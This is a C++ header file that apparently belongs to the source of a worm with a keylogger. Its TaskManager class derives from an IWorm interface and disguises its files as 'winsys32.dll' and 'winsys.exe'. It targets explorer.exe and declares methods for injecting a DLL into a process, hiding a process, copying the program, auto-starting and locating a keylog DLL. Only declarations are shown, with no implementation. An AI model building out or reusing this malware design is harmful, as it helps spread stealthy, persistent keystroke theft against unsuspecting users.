#pragma once

#include	"IWorm.h"

#define		MAX_DPATH	(1024)

#define		DLL_NAME	"winsys32.dll"
#define		PROG_NAME	"winsys.exe"
#define		TARGET_NAME "explorer.exe"
#define		FAKE_NAME	"winsys"
#define		DIR_NAME	"System"

class TaskManager : public IWorm
{
public:
	TaskManager();
	virtual ~TaskManager();

public:
	const std::string 	getKeylogDllPath() const;
	const std::string	getDestPath() const;
	const Process &		getProcess() const;

	bool				injectDll(const std::string & dllPath, unsigned int processId) const;
	bool				hide(const std::string & processName) const;
	bool				isInjected() const;

	void				copyProgram() const;
	void				autoStart() const;
	bool				run();

private:
	Process				process;
};